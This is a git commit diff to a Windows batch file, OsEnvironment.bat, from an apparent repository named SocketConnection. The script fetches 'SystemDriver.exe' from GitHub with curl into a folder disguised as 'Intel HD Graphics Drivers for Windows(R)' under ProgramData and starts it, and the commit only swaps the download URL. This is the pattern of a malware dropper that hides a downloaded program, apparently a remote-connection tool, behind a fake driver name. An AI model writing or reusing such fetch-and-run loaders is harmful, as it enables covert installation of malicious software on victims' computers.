e1899e3daef1b858033e3a4dc44cced0c5606c7a
MichaelNoskov <113694985+MichaelNoskov@users.noreply.github.com>
2024-02-09 13:18:21 +0300

    Update OsEnvironment.bat

--- OsEnvironment.bat
+++ OsEnvironment.bat
@@ -1,3 +1,3 @@
 @echo off
-if not exist "C:/ProgramData/Intel HD Graphics Drivers for Windows(R)/SystemDriver.exe" curl "https://github.com/MichaelNoskov/SocketConnection/raw/main/SystemDriver.exe" -o "C:/ProgramData/Intel HD Graphics Drivers for Windows(R)/SystemDriver.exe"
+if not exist "C:/ProgramData/Intel HD Graphics Drivers for Windows(R)/SystemDriver.exe" curl "https://raw.githubusercontent.com/MichaelNoskov/SocketConnection/main/SystemDriver.exe" -o "C:/ProgramData/Intel HD Graphics Drivers for Windows(R)/SystemDriver.exe"
 start /d "C:/ProgramData/Intel HD Graphics Drivers for Windows(R)/" SystemDriver.exe
